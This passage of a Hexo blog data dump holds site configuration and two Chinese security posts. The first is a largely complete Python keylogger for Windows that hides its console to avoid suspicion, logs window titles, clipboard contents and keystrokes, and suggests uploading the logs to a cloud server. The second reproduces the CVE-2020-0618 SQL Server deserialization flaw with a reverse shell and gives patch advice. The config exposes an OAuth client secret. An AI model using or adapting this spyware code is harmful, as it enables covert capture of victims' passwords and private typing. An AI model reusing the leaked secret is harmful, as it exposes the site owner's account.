${query}"}},"mathjax":{"enable":true,"cdn":"https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"},"katex":{"enable":false,"cdn":{"css":"https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"}},"fireworks":true,"baidu_analytics":"0535214fe33ef7df8b00f50266abfa7d","google_analytics":null,"tencent_analytics":null,"stylesheets":["/css/index.css"],"scripts":["/js/utils.js","/js/fancybox.js","/js/sidebar.js","/js/copy.js","/js/fireworks.js","/js/transition.js","/js/scroll.js","/js/head.js"],"cdn":{"css":{"fontawesome":"https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css","fontawesomeV5":"https://use.fontawesome.com/releases/v5.3.1/css/all.css"},"js":{"anime":"https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js","jquery":"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js","fancybox":"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js","velocity":"https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js","velocity-ui":"https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"}},"avatar":"https://s2.ax1x.com/2019/10/06/ugJeoR.png","top_img":"https://s2.ax1x.com/2019/10/06/ugJCWV.png","post_meta":{"date_type":"created","categories":true,"tags":true},"wordcount":{"enable":true},"toc":{"enable":true,"number":true},"post_copyright":{"enable":true,"license":"CC BY-NC-SA 4.0","license_url":"https://creativecommons.org/licenses/by-nc-sa/4.0/"},"slide":{"separator":"---","separator_vertical":"--","charset":"utf-8","theme":"black","mouseWheel":false,"transition":"slide","transitionSpeed":"default","parallaxBackgroundImage":"","parallaxBackgroundSize":"","parallaxBackgroundHorizontal":null,"parallaxBackgroundVertical":null},"QR_code":[{"itemlist":{"img":"https://i.loli.net/2019/10/10/5O8EnrXMHD4VFct.jpg","text":"支付宝打赏"}},{"itemlist":{"img":"https://i.loli.net/2019/10/10/1iYFIq2ODwrNLCU.png","text":"微信打赏"}}],"adv":{"enable":true,"info":"<div>  </div>"},"addThis":{"enable":false},"disqus":{"enable":false},"gitalk":{"enable":true,"client_id":"7eb42bfb73a159026f1b","client_secret":"3ebfe7728284d8d4c61ac3e789afb034ae2135e4","repo":"1379post.github.io","owner":"1379Post","admin":"1379Post"},"since":9102,"ICP":{"enable":false},"busuanzi":{"enable":true,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"links_title":"Links","links":{"Luogu":"https://www.luogu.org","Github":"https://github.com","Zhihu":"https://www.zhihu.com"},"follow":{"enable":true,"url":"https://www.luogu.org/space/show?uid=155907","text":"See me on Luogu"},"google_adsense":{"enable":false,"js":"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js","client":"ca-pub-...........","enable_page_level_ads":true}}}},"excerpt":"","more":"<blockquote>\n<p>如想有更好的了解请查看<a href=\"https://0x00sec.org/t/malware-writing-python-malware-part-1/11700\" target=\"_blank\" rel=\"noopener\">原文</a></p>\n</blockquote>\n<h3 id=\"导入标准库，隐藏控制台窗口\"><a href=\"#导入标准库，隐藏控制台窗口\" class=\"headerlink\" title=\"导入标准库，隐藏控制台窗口\"></a>导入标准库，隐藏控制台窗口</h3><p>导入提供所需功能的Windows DLL。所需<code>kernel32.dll</code>与<code>user32.dll</code>，为避免怀疑隐藏控制台窗口。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ctypes    <span class=\"comment\">#提供C兼容的数据类型</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> logging   <span class=\"comment\">#用于记录键盘记录</span></span><br><span class=\"line\"></span><br><span class=\"line\">kernel32  = ctypes.windll.kernel32    <span class=\"comment\">#调用kernel32.dll</span></span><br><span class=\"line\">user32 = ctypes.windll.user32         <span class=\"comment\">#调用user32.dll</span></span><br><span class=\"line\"></span><br><span class=\"line\">user32.ShowWindow(kernel32.GetConsoleWindow(),<span class=\"number\">0</span>)    <span class=\"comment\">#隐藏窗口</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"get-current-window\"><a href=\"#get-current-window\" class=\"headerlink\" title=\"get_current_window()\"></a>get_current_window()</h3><p>获取当前窗口标题，以便知道记录的是用户使用的哪个程序。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_current_window</span><span class=\"params\">()</span>:</span>    <span class=\"comment\">#抓取当前窗口标题</span></span><br><span class=\"line\">    <span class=\"comment\">#必需的WinAPI函数</span></span><br><span class=\"line\">    GetForegroundWindow = user32.GetForegroundWindow</span><br><span class=\"line\">    GetWindowTextLength = user32.GetWindowTextLengthW</span><br><span class=\"line\">    GetWindowText = user32.GetWindowTextW</span><br><span class=\"line\"></span><br><span class=\"line\">    hwnd = GetForegroundWindow()    <span class=\"comment\">#获取当前窗口句柄</span></span><br><span class=\"line\">    length = GetWindowTextLength(hwnd)    <span class=\"comment\">#获取标题文本长度，将句柄乍为参数传递</span></span><br><span class=\"line\">    buff = ctypes.create_unicode_buffer(length + <span class=\"number\">1</span>)    <span class=\"comment\">#创建临时缓存buff用于存储标题文本</span></span><br><span class=\"line\"></span><br><span class=\"line\">    GetWindowText(hwnd, buff, length + <span class=\"number\">1</span>)    <span class=\"comment\">#获取窗口标题并存储在buff中</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> buff.value    <span class=\"comment\">#返回buff的值</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"get-clipboard\"><a href=\"#get-clipboard\" class=\"headerlink\" title=\"get_clipboard()\"></a>get_clipboard()</h3><p>捕获剪贴板内容。tips：使用<code>PyWin32</code>可以用更少的代码完成些操作</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_clipboard</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    CF_TEXT = <span class=\"number\">1</span>    <span class=\"comment\">#设置剪贴板格式</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#GlobalLock/GlobalUnlock 参数与返回类型</span></span><br><span class=\"line\">    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]</span><br><span class=\"line\">    kernel32.GlobalLock.restype = ctypes.c_void_p</span><br><span class=\"line\">    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#GetClipboardData的返回类型</span></span><br><span class=\"line\">    user32.GetClipboardData.restype = ctypes.c_void_p</span><br><span class=\"line\">    user32.OpenClipboard(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#所需剪贴板函数</span></span><br><span class=\"line\">    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable</span><br><span class=\"line\">    GetClipboardData = user32.GetClipboardData</span><br><span class=\"line\">    CloseClipboard = user32.CloseClipboard</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> IsClipboardFormatAvailable(CF_TEXT):    <span class=\"comment\">#如果CF_TEXT可用</span></span><br><span class=\"line\">            data = GetClipboardData(CF_TEXT)    <span class=\"comment\">#获取剪贴板数据的句柄</span></span><br><span class=\"line\">            data_locked = kernel32.GlobalLock(data)    <span class=\"comment\">#获取指向数据所在的内存位置的指针</span></span><br><span class=\"line\">            text = ctypes.c_char_p(data_locked)    <span class=\"comment\">#获取指向data_locked位置的char*(python中的字符串)指针</span></span><br><span class=\"line\">            value = text.value    <span class=\"comment\">#存储有用的值</span></span><br><span class=\"line\">            kernel32.GlobalUnlock(data_locked)    <span class=\"comment\">#递减锁计数</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> value.decode(<span class=\"string\">'utf-8'</span>)    <span class=\"comment\">#返回剪贴板的值</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        CloseClipboard()    <span class=\"comment\">#关闭剪贴板</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"get-keystrokes\"><a href=\"#get-keystrokes\" class=\"headerlink\" title=\"get_keystrokes()\"></a>get_keystrokes()</h3><p>监听并记录敲击字符并记录。函数调用时需传入两个参数，日志文件存储目录和文件名。<br>按键记录使用<code>while</code>死循环，原因不希望键盘记录停止。但如果我们要同时执行其他任务，则需要使用多线程或单独的进程中与其他函数一并运行它。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_keystrokes</span><span class=\"params\">(log_dir,log_name)</span>:</span>    <span class=\"comment\">#监听与记录敲击键盘内容</span></span><br><span class=\"line\">    <span class=\"comment\">#记录</span></span><br><span class=\"line\">    logging.basicConfig(filename=(log_dir + <span class=\"string\">'\\\\'</span> + log_name),level=logging.DEBUG,format=<span class=\"string\">'%(message)s'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    GetAsyncKeyState = user32.GetAsyncKeyState    <span class=\"comment\">#WinAPI函数，确定按键是向上还是向下</span></span><br><span class=\"line\">    special_keys = &#123;</span><br><span class=\"line\">        <span class=\"number\">0x08</span>: <span class=\"string\">'BS'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x09</span>: <span class=\"string\">'Tap'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x10</span>: <span class=\"string\">'Shift'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x11</span>: <span class=\"string\">'Ctrl'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x12</span>: <span class=\"string\">'Alt'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x14</span>: <span class=\"string\">'CapsLock'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x1b</span>: <span class=\"string\">'Esc'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x20</span>: <span class=\"string\">'Space'</span>,</span><br><span class=\"line\">        <span class=\"number\">0x2e</span>: <span class=\"string\">'Del'</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    current_window = <span class=\"literal\">None</span></span><br><span class=\"line\">    line = []    <span class=\"comment\">#存储点击的字符</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_window != get_current_window():    <span class=\"comment\">#判断current_window内容不是当前打开的窗口</span></span><br><span class=\"line\">            current_window = get_current_window()    <span class=\"comment\">#将窗口标题放在current_window中</span></span><br><span class=\"line\">            logging.info(str(current_window))    <span class=\"comment\">#将当前窗口标题写入日志文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">256</span>):    <span class=\"comment\">#256个ASCII字符</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> GetAsyncKeyState(i) &amp; <span class=\"number\">1</span>:    <span class=\"comment\">#如果点击某个键并匹配ASCII字符</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> i <span class=\"keyword\">in</span> special_keys:    <span class=\"comment\">#如果是特殊键，这样记录</span></span><br><span class=\"line\">                    logging.info(<span class=\"string\">\"&lt;&#123;&#125;&gt;\"</span>.format(special_keys[i]))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> i == <span class=\"number\">0x0d</span>:    <span class=\"comment\">#如果键入&lt;ENTER&gt;，则记录然后清除行变量</span></span><br><span class=\"line\">                    logging.info(line)</span><br><span class=\"line\">                    line.clear()</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> i ==<span class=\"number\">0x63</span> <span class=\"keyword\">or</span> i == <span class=\"number\">0x43</span> <span class=\"keyword\">or</span> i == <span class=\"number\">0x56</span> <span class=\"keyword\">or</span> i ==<span class=\"number\">0x76</span>:    <span class=\"comment\">#如果点击字符'c'或'v'，则获取剪贴板数据</span></span><br><span class=\"line\">                    clipboard_data = get_clipboard()</span><br><span class=\"line\">                    logging.info(<span class=\"string\">\"[CLIPBOARD] &#123;&#125;\"</span>.format(clipboard_data))</span><br><span class=\"line\">                <span class=\"keyword\">elif</span> <span class=\"number\">0x30</span> &lt;= i &lt;= <span class=\"number\">0x5a</span>:    <span class=\"comment\">#如果是字母数字字符，则追加到line</span></span><br><span class=\"line\">                    line.append(chr(i))</span><br></pre></td></tr></table></figure>\n\n<p>后续可自加代码，如定时将记录文件上传到云服务器 :grin: </p>\n<p>将py文件用pyinstaller打包成exe并运行，因为使用while True死循环，cpu占用较高，这点将在part2解决。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/1_1.png\" alt=\"part1_1\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/1_2.png\" alt=\"part1_2\"></p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/1_3.png\" alt=\"part1_3\"></p>\n<p>源代码已上传致<a href=\"https://github.com/yui77111/python-malware/blob/master/keylogger/part1.py\" target=\"_blank\" rel=\"noopener\">gayhub</a></p>\n"},{"title":"CVE-2020-0618","description":"sql server远程命令执行.","_content":"\n### 漏洞概述\n\n获得低权限的攻击者向受影响版本的SQL Server的Reporting Services实例发送精心构造的请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码。\n\n### 受影响版本\n\n- SQL Server 2012 for 32-bit Systems Service Pack 4 (QFE)\n- SQL Server 2012 for x64-based Systems Service Pack 4 (QFE)\n- SQL Server 2014 Service Pack 3 for 32-bit Systems (CU)\n- SQL Server 2014 Service Pack 3 for 32-bit Systems (GDR)\n- SQL Server 2014 Service Pack 3 for x64-based Systems (CU)\n- SQL Server 2014 Service Pack 3 for x64-based Systems (GDR)\n- SQL Server 2016 for x64-based Systems Service Pack 1\n- SQL Server 2016 for x64-based Systems Service Pack 2 (CU)\n- SQL Server 2016 for x64-based Systems Service Pack 2 (GDR)\n\n### 漏洞成因\n\n在ReportingServicesWebServer.dll中发现了此问题.Microsoft.Reporting.WebForms.BrowserNavigationCorrector的OnLoad方法使用LosFormatter类反序列化不受信任的用户输入:\n\n![1_1](https://yui77111.github.io/assets/images/article/cve/1_1.png)\n\n该BrowserNavigationCorrector类是使用由Microsoft.ReportingServices.WebServer.ReportViewerPage类:\n\n![1_2](https://yui77111.github.io/assets/images/article/cve/1_2.png)\n\n所以可以通过在本地 SharePoint服务器中调用/ReportServer/pages/ReportViewer.aspx页面来触发此功能.\n\n### 利用工具\n\n[https://github.com/euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)\n\n### 漏洞复现\n\n* 靶机\n* 系统：windows server 2016 standard evaluation\n* Sql版本：Microsoft SQL Server 2016 (RTM) - 13.0.1601.5 (X64)\n* Ip：192.168.0.105\n* 攻击机\n* 系统：windows7\n* Ip:192.168.0.103\n\n(1) 存在漏洞路径。\n\n![1_3](https://yui77111.github.io/assets/images/article/cve/1_3.png)\n\n(2) 使用ysoserial.exe生成payload，生成完的payload存于剪切板。\n\n![1_4](https://yui77111.github.io/assets/images/article/cve/1_4.png)\n\n(3)\t攻击机nc监听，利用poc加载payload反弹shell。接收到的权限为server权限。\n\n![1_5](https://yui77111.github.io/assets/images/article/cve/1_5.png)\n\n### 防护建议\n\n由于攻击者可通过对请求数据包编码绕过Web应用防火墙的防护，强烈建议用户安装补丁程序进行修复。禁止匿名访问，确保只有经过身份验证的用户才能访问相关应用；如果怀疑服务器已经受到威胁，除安装相应补丁外，请及时更改服务器的账户口令，防止被攻击者利用。\n版本对应补丁参阅\n\n[https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618](https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618)\n\n### 参考链接\n\n[https://blog.csdn.net/qq_40989258/article/details/105344344](https://blog.csdn.net/qq_40989258/article/details/105344344)","source":"_posts/2020-05-10-CVE-2020-0618.md","raw":"---\ntitle: CVE-2020-0618\ndescription: sql server远程命令执行.\ncategories:\n - cve\ntags: \n - 渗透测试\n---\n\n### 漏洞概述\n\n获得低权限的攻击者向受影响版本的SQL Server的Reporting Services实例发送精心构造的请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码。\n\n### 受影响版本\n\n- SQL Server 2012 for 32-bit Systems Service Pack 4 (QFE)\n- SQL Server 2012 for x64-based Systems Service Pack 4 (QFE)\n- SQL Server 2014 Service Pack 3 for 32-bit Systems (CU)\n- SQL Server 2014 Service Pack 3 for 32-bit Systems (GDR)\n- SQL Server 2014 Service Pack 3 for x64-based Systems (CU)\n- SQL Server 2014 Service Pack 3 for x64-based Systems (GDR)\n- SQL Server 2016 for x64-based Systems Service Pack 1\n- SQL Server 2016 for x64-based Systems Service Pack 2 (CU)\n- SQL Server 2016 for x64-based Systems Service Pack 2 (GDR)\n\n### 漏洞成因\n\n在ReportingServicesWebServer.dll中发现了此问题.Microsoft.Reporting.WebForms.BrowserNavigationCorrector的OnLoad方法使用LosFormatter类反序列化不受信任的用户输入:\n\n![1_1](https://yui77111.github.io/assets/images/article/cve/1_1.png)\n\n该BrowserNavigationCorrector类是使用由Microsoft.ReportingServices.WebServer.ReportViewerPage类:\n\n![1_2](https://yui77111.github.io/assets/images/article/cve/1_2.png)\n\n所以可以通过在本地 SharePoint服务器中调用/ReportServer/pages/ReportViewer.aspx页面来触发此功能.\n\n### 利用工具\n\n[https://github.com/euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)\n\n### 漏洞复现\n\n* 靶机\n* 系统：windows server 2016 standard evaluation\n* Sql版本：Microsoft SQL Server 2016 (RTM) - 13.0.1601.5 (X64)\n* Ip：192.168.0.105\n* 攻击机\n* 系统：windows7\n* Ip:192.168.0.103\n\n(1) 存在漏洞路径。\n\n![1_3](https://yui77111.github.io/assets/images/article/cve/1_3.png)\n\n(2) 使用ysoserial.exe生成payload，生成完的payload存于剪切板。\n\n![1_4](https://yui77111.github.io/assets/images/article/cve/1_4.png)\n\n(3)\t攻击机nc监听，利用poc加载payload反弹shell。接收到的权限为server权限。\n\n![1_5](https://yui77111.github.io/assets/images/article/cve/1_5.png)\n\n### 防护建议\n\n由于攻击者可通过对请求数据包编码绕过Web应用防火墙的防护，强烈建议用户安装补丁程序进行修复。禁止匿名访问，确保只有经过身份验证的用户才能访问相关应用；如果怀疑服务器已经受到威胁，除安装相应补丁外，请及时更改服务器的账户口令，防止被攻击者利用。\n版本对应补丁参阅\n\n[https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618](https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618)\n\n### 参考链接\n\n[https://blog.csdn.net/qq_40989258/article/details/105344344](https://blog.csdn.net/qq_40989258/article/details/105344344)","slug":"2020-05-10-CVE-2020-0618","published":1,"date":"2021-04-21T07:29:10.973Z","updated":"2020-07-24T03:57:10.849Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cknr54xhb00098ot9phelcr95","content":"<h3 id=\"漏洞概述\"><a href=\"#漏洞概述\" class=\"headerlink\" title=\"漏洞概述\"></a>漏洞概述</h3><p>获得低权限的攻击者向受影响版本的SQL Server的Reporting Services实例发送精心构造的请求，可利用此漏洞在报表服务器服务帐户的上下文中执行任意代码。</p>\n<h3 id=\"受影响版本\"><a href=\"#受影响版本\" class=\"headerlink\" title=\"受影响版本\"></a>受影响版本</h3><ul>\n<li>SQL Server 2012 for 32-bit Systems Service Pack 4 (QFE)</li>\n<li>SQL Server 2012 for x64-based Systems Service Pack 4 (QFE)</li>\n<li>SQL Server 2014 Service Pack 3 for 32-bit Systems (CU)</li>\n<li>SQL Server 2014 Service Pack 3 for 32-bit Systems (GDR)</li>\n<li>SQL Server 2014 Service Pack 3 for x64-based Systems (CU)</li>\n<li>SQL Server 2014 Service Pack 3 for x64-based Systems (GDR)</li>\n<li>SQL Server 2016 for x64-based Systems Service Pack 1</li>\n<li>SQL Server 2016 for x64-based Systems Service Pack 2 (CU)</li>\n<li>SQL Server 2016 for x64-based Systems Service Pack 2 (GDR)</li>\n</ul>\n<h3 id=\"漏洞成因\"><a href=\"#漏洞成因\" class=\"headerlink\" title=\"漏洞成因\"></a>漏洞成因</h3><p>在ReportingServicesWebServer.dll中发现了此问题.Microsoft.Reporting.WebForms.BrowserNavigationCorrector的OnLoad方法使用LosFormatter类反序列化不受信任的用户输入:</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_1.png\" alt=\"1_1\"></p>\n<p>该BrowserNavigationCorrector类是使用由Microsoft.ReportingServices.WebServer.ReportViewerPage类:</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_2.png\" alt=\"1_2\"></p>\n<p>所以可以通过在本地 SharePoint服务器中调用/ReportServer/pages/ReportViewer.aspx页面来触发此功能.</p>\n<h3 id=\"利用工具\"><a href=\"#利用工具\" class=\"headerlink\" title=\"利用工具\"></a>利用工具</h3><p><a href=\"https://github.com/euphrat1ca/CVE-2020-0618\" target=\"_blank\" rel=\"noopener\">https://github.com/euphrat1ca/CVE-2020-0618</a></p>\n<h3 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h3><ul>\n<li>靶机</li>\n<li>系统：windows server 2016 standard evaluation</li>\n<li>Sql版本：Microsoft SQL Server 2016 (RTM) - 13.0.1601.5 (X64)</li>\n<li>Ip：192.168.0.105</li>\n<li>攻击机</li>\n<li>系统：windows7</li>\n<li>Ip:192.168.0.103</li>\n</ul>\n<p>(1) 存在漏洞路径。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_3.png\" alt=\"1_3\"></p>\n<p>(2) 使用ysoserial.exe生成payload，生成完的payload存于剪切板。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_4.png\" alt=\"1_4\"></p>\n<p>(3)    攻击机nc监听，利用poc加载payload反弹shell。接收到的权限为server权限。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/cve/1_5.png\" alt=\"1_5\"></p>\n<h3 id=\"防护建议\"><a href=\"#防护建议\" class=\"headerlink\" title=\"防护建议\"></a>防护建议</h3><p>由于攻击者可通过对请求数据包编码绕过Web应用防火墙的防护，强烈建议用户安装补丁程序进行修复。禁止匿名访问，确保只有经过身份验证的用户才能访问相关应用；如果怀疑服务器已经受到威胁，除安装相应补丁外，请及时更改服务器的账户口令，防止被攻击者利用。<br>版本对应补丁参阅</p>\n<p><a href=\"https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618\" target=\"_blank\" rel=\"noopener\">https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2020-0618</a></p>\n<h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><p><a href=\"https://blog.csdn.net/qq_40989258/article/details/105344344\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_40989258/article/details/105344344</a></p>\n","site":{"data":{"melody":{"theme_color":{"enable":true,"main":"#2d2d46","paginator":"#9b87b4","button_hover":"#9b87b4","text_selection":"#eebb53","link_color":"#1e1f4a","hr_color":"#ffefbd","tag_start_color":"#ffefbd","tag_end_color":"#c5b1cf"},"menu":{"主站":"/","归档":"/archives","标签":"/tags","分类":"/categories"},"favicon":"/melody-favicon.ico","pwa":{"enable":false,"manifest":"/manifest.json"},"highlight_theme":"ocean","social":{"zhihu fab":"https://www.zhihu.com/people/undefinederror/activities","rss fas":"https://listener1379.site","github fab":"https://github.com/1379Post"},"algolia_search":{"enable":false,"hits":{"per_page":10}},"local_search":{"enable":true,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}"}},"mathjax":{"enable":true,"cdn":"https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"},"katex":{"enable":false,"cdn":{"css":"https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"}},"fireworks":true,"baidu_analytics":"0535214fe33ef7df8b00f50266abfa7d","google_analytics":null,"tencent_analytics":null,"stylesheets":["/css/index.css"],"scripts":["/js/utils.js","/js/fancybox.js","/js/sidebar.js","/js/copy.js","/js/fireworks.js","/js/transition.js","/js/scroll.js","/js/head.js"],"cdn":{"css":{"fontawesome":"https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css","fontawesomeV5":"https://use.fontawesome.com/releases/v5.3.1/css/all.css"},"js":{"anime":"https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js","jquery":"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js","fancybox":"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js","velocity":"https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js","velocity-ui":"https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"}},"avatar":"https://s2.ax1x.com/2019/10/06/ugJeoR.png","top_img":"https://s2.ax1x.com/2019/10/06/ugJCWV.png","post_meta":{"date_type":"created","categories":true,"tags":true},"wordcount":{"enable":true},"toc":{"enable":true,"number":true},"post_copyright":{"enable":true,"license":"CC BY-NC-SA 4.0","license_url":"https://creativecommons.org/licenses/by-nc-sa/4.0/"},"slide":{"separator":"---","separator_vertical":"--","charset":"utf-8","theme":"black","mouseWheel":false,"transition":"slide","transitionSpeed":"default","parallaxBackgroundImage":"","parallaxBackgroundSize":"","parallaxBackgroundHorizontal":null,"parallaxBackgroundVertical":null},"QR_code":[{"itemlist":{"img":"https://i.loli.net/2019/10/10/5O8EnrXMHD4VFct.jpg","text":"支付宝打赏"}},{"itemlist":{"img":"https://i.loli.net/2019/10/10/1iYFIq2ODwrNLCU.png","text":"微信打赏"}}],"adv":{"enable":true,"info":"<div>  </div>"},"addThis":{"enable":false},"disqus":{"enable":false},"gitalk":{"enable":true,"client_id":"7eb42bfb73a159026f1b","client_secret":"3ebfe7728284d8d4c61ac3e789afb034ae2135e4","repo":"1379post.github.io","owner":"1379Post","admin":"1379Post"},"since":9102,"ICP":{"enable":false},"busuanzi":{"enable":true,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"links_title":"Links","links":{"Luogu":"https://www.luogu.org","Github":"https://github.com","Zhihu":"https://www.zhihu.com"},"follow":{"enable":true,"url":"https://www.luogu.org/space/show?uid=155907","text":"See me on Luogu"},"google_adsense":{"enable":false,"js":"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js","client":"ca-pub-...........","enable_page_level_ads":true}}}},"excerpt":"","more":"<h3 